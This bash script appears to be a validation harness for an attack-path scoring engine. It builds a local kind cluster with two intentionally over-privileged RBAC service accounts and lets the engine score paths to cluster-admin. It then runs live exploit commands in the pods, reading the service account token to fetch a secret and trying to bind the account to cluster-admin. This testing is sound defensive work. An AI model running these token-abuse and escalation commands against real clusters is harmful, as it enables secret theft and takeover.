#!/usr/bin/env bash
#
# validate-harness-k8s.sh - real-verdict harness on REAL Kubernetes topology.
#
# Unlike the log4shell harness (which models the path with hardcoded edge probs),
# this stands up a real kind cluster with two deliberately-misconfigured RBAC
# scenarios, lets the k8s collector DISCOVER the topology (so the attack-path SCORE
# is the engine's real output, not a wired number), then EXPLOITS each path and takes
# the verdict from an INDEPENDENT oracle - the Kubernetes API server's own RBAC
# decision:
#
#   * reader  : a ServiceAccount with cluster-wide `secrets/read`. It reads a secret
#               it shouldn't -> HTTP 200 -> CONFIRMED (a genuine over-privilege).
#   * webapp  : a ServiceAccount with `bind` on clusterrolebindings. It tries to bind
#               itself to cluster-admin -> Kubernetes' anti-privesc blocks it (403) ->
#               REFUTED. A real FALSE POSITIVE: the collector's escalation heuristic
#               over-reports the bind primitive. Exactly what calibration should catch.
#
#   make validate-harness-k8s
#   SUFFIX=$(date +%s) make validate-harness-k8s   # distinct paths -> accumulate volume
#
# Requirements: kind, kubectl, docker, curl, jq, and the stack up (`make up-full`).
# The kind cluster is LEFT running so you can accumulate; DELETE_CLUSTER=1 tears it down.
set -euo pipefail

CLUSTER=${CLUSTER:-pg-goat}
SUFFIX=${SUFFIX:-}                        # set to make distinct paths (each a new sample)
NS=${NS:-vuln}
INGEST_URL=${INGEST_URL:-http://localhost:8081}
API_URL=${API_URL:-http://localhost:8080}
ANALYZER_WAIT=${ANALYZER_WAIT:-35}
DELETE_CLUSTER=${DELETE_CLUSTER:-}
GO=${GO:-go}; export GOTOOLCHAIN=${GOTOOLCHAIN:-go1.25.11}
sfx() { [ -n "$SUFFIX" ] && echo "-$SUFFIX" || echo ""; }
S="$(sfx)"
WEBAPP="webapp$S"; READER="reader$S"; SECRET="crown-secret$S"

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
TMP="$(mktemp -d)"
KC="kubectl --context kind-${CLUSTER}"
say()  { printf '\n\033[1;36m== %s\033[0m\n' "$*"; }
ok()   { printf '  \033[32mok\033[0m %s\n' "$*"; }
warn() { printf '  \033[33m!\033[0m  %s\n' "$*"; }
die()  { printf '  \033[31mx\033[0m  %s\n' "$*" >&2; exit 1; }
cleanup() { rm -rf "$TMP"; [ -n "$DELETE_CLUSTER" ] && { warn "deleting cluster $CLUSTER"; kind delete cluster --name "$CLUSTER" >/dev/null 2>&1 || true; } || true; }
trap cleanup EXIT

# ── 0. Preconditions ─────────────────────────────────────────────────
say "0. preconditions"
for b in kind kubectl docker curl jq; do command -v "$b" >/dev/null 2>&1 || die "$b not found"; done
curl -sf "$API_URL/healthz" >/dev/null 2>&1 || die "API unreachable at $API_URL (run: make up-full)"
ok "stack is up"

# ── 1. Ensure a kind cluster ─────────────────────────────────────────
say "1. kind cluster '$CLUSTER'"
if kind get clusters 2>/dev/null | grep -qx "$CLUSTER"; then ok "reusing existing cluster"
else kind create cluster --name "$CLUSTER" --wait 120s >/dev/null 2>&1 || die "kind create failed"; ok "created cluster"; fi

# ── 2. Deploy the two deliberately-misconfigured RBAC scenarios ──────
say "2. deploy vulnerable RBAC scenarios (reader = real over-privilege, webapp = over-reported)"
cat > "$TMP/scn.yaml" <<YAML
apiVersion: v1
kind: Namespace
metadata: { name: ${NS} }
---
apiVersion: v1
kind: Secret
metadata: { name: ${SECRET}, namespace: default }
type: Opaque
stringData: { db-password: "demo-not-a-real-secret" }
---
apiVersion: v1
kind: ServiceAccount
metadata: { name: ${READER}, namespace: ${NS} }
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata: { name: ${READER}-secrets }
rules: [{ apiGroups: [""], resources: ["secrets"], verbs: ["get","list"] }]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata: { name: ${READER}-crb }
roleRef: { apiGroup: rbac.authorization.k8s.io, kind: ClusterRole, name: ${READER}-secrets }
subjects: [{ kind: ServiceAccount, name: ${READER}, namespace: ${NS} }]
---
apiVersion: apps/v1
kind: Deployment
metadata: { name: ${READER}, namespace: ${NS} }
spec:
  replicas: 1
  selector: { matchLabels: { app: ${READER} } }
  template:
    metadata: { labels: { app: ${READER} } }
    spec:
      serviceAccountName: ${READER}
      containers: [{ name: web, image: curlimages/curl:latest, command: ["sleep","3600"] }]
---
apiVersion: v1
kind: Service
metadata: { name: ${READER}, namespace: ${NS} }
spec: { type: NodePort, selector: { app: ${READER} }, ports: [{ port: 80, targetPort: 80 }] }
---
apiVersion: v1
kind: ServiceAccount
metadata: { name: ${WEBAPP}, namespace: ${NS} }
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata: { name: ${WEBAPP}-escalate }
rules: [{ apiGroups: ["rbac.authorization.k8s.io"], resources: ["clusterrolebindings"], verbs: ["create","bind","get","list"] }]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata: { name: ${WEBAPP}-crb }
roleRef: { apiGroup: rbac.authorization.k8s.io, kind: ClusterRole, name: ${WEBAPP}-escalate }
subjects: [{ kind: ServiceAccount, name: ${WEBAPP}, namespace: ${NS} }]
---
apiVersion: apps/v1
kind: Deployment
metadata: { name: ${WEBAPP}, namespace: ${NS} }
spec:
  replicas: 1
  selector: { matchLabels: { app: ${WEBAPP} } }
  template:
    metadata: { labels: { app: ${WEBAPP} } }
    spec:
      serviceAccountName: ${WEBAPP}
      containers: [{ name: web, image: curlimages/curl:latest, command: ["sleep","3600"] }]
---
apiVersion: v1
kind: Service
metadata: { name: ${WEBAPP}, namespace: ${NS} }
spec: { type: NodePort, selector: { app: ${WEBAPP} }, ports: [{ port: 80, targetPort: 80 }] }
YAML
$KC apply -f "$TMP/scn.yaml" >/dev/null || die "kubectl apply failed"
$KC -n "$NS" wait --for=condition=Ready pod -l app="$READER" --timeout=120s >/dev/null || die "$READER pod not ready"
$KC -n "$NS" wait --for=condition=Ready pod -l app="$WEBAPP" --timeout=120s >/dev/null || die "$WEBAPP pod not ready"
ok "pods ready"

# ── 3. Discover the real topology (the k8s collector) ────────────────
say "3. ingest real cluster topology -> engine surfaces paths with REAL scores"
$KC get ingress,service,pod,serviceaccount,role,clusterrole,rolebinding,clusterrolebinding -A -o json \
  | curl -sS -X POST "$INGEST_URL/ingest/k8s" -H 'Content-Type: application/json' --data-binary @- | jq -c '{nodes,edges}'
sleep "$ANALYZER_WAIT"

find_path() { # entry-name -> "id score" (highest priority match to cluster-admin)
  curl -s -X POST "$API_URL/graphql" -H 'Content-Type: application/json' \
    -d '{"query":"{ attackPaths { id score priority nodes { name } } }"}' \
    | jq -r --arg e "$1" '[.data.attackPaths[] | select(.nodes[0].name==$e)] | sort_by(-.priority)[0] // empty | "\(.id) \(.score)"'
}

# ── 4. Exploit each path; the verdict is the API server's real RBAC decision ─
record=""
verdict() { # name entry pod-label exploit-cmd expect-note
  local name="$1" entry="$2" label="$3" expect="$4"; shift 4
  say "4.$name: exploit the live path (oracle: the API server's RBAC decision)"
  local ps; ps=$(find_path "$entry"); [ -n "$ps" ] || { warn "no path for entry '$entry' - skipping"; return; }
  local id score; id=${ps%% *}; score=${ps##* }
  ok "engine surfaced the path: $entry -> ... -> cluster-admin  score=$score  ($expect)"
  local pod; pod=$($KC -n "$NS" get pod -l app="$label" -o jsonpath='{.items[0].metadata.name}')
  local code; code=$($KC -n "$NS" exec "$pod" -- sh -c "$*" 2>/dev/null)
  local outcome; if [ "$code" = 200 ] || [ "$code" = 201 ]; then outcome=confirmed; ok "HTTP $code -> CONFIRMED (genuinely exploitable)"; else outcome=refuted; warn "HTTP $code -> REFUTED (RBAC blocked / not exploitable)"; fi
  record="${record}{\"target\":\"cluster-admin\",\"from\":\"$entry\",\"scope\":\"path\",\"outcome\":\"$outcome\",\"evidence\":\"live k8s exploit: HTTP $code (score $score)\"},"
}

verdict reader "$READER" "$READER" "expect CONFIRMED" \
  'T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sk -o /dev/null -w "%{http_code}" https://kubernetes.default.svc/api/v1/namespaces/default/secrets/'"$SECRET"' -H "Authorization: Bearer $T"'
verdict webapp "$WEBAPP" "$WEBAPP" "expect REFUTED (over-reported)" \
  'T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sk -o /dev/null -w "%{http_code}" -X POST https://kubernetes.default.svc/apis/rbac.authorization.k8s.io/v1/clusterrolebindings -H "Authorization: Bearer $T" -H "Content-Type: application/json" -d "{\"metadata\":{\"name\":\"pwned'"$S"'\"},\"roleRef\":{\"apiGroup\":\"rbac.authorization.k8s.io\",\"kind\":\"ClusterRole\",\"name\":\"cluster-admin\"},\"subjects\":[{\"kind\":\"ServiceAccount\",\"name\":\"'"$WEBAPP"'\",\"namespace\":\"'"$NS"'\"}]}"'

[ -n "$record" ] || die "no verdicts produced (did the paths form? give it longer via ANALYZER_WAIT)"

# ── 5. Record the real verdicts -> calibration ───────────────────────
say "5. record the real verdicts -> calibration"
$GO build -o "$TMP/pg" "$ROOT/backend/cmd/perspectivegraph" 2>/dev/null \
  || (cd "$ROOT/backend" && $GO build -o "$TMP/pg" ./cmd/perspectivegraph) || die "CLI build failed"
printf '{"source":"k8s-goat-harness","findings":[%s]}' "${record%,}" > "$TMP/report.json"
"$TMP/pg" importverdicts --file "$TMP/report.json" --api "$API_URL"

say "6. calibration after this run"
curl -s "$API_URL/validations" | jq -c '{metrics: .metrics, calibration: (.calibration | {samples,verdict,diagnosis,persistent})}'
echo
ok "done. Real topology + real RBAC outcomes. Vary SUFFIX to accumulate distinct samples; DELETE_CLUSTER=1 to tear down the cluster."
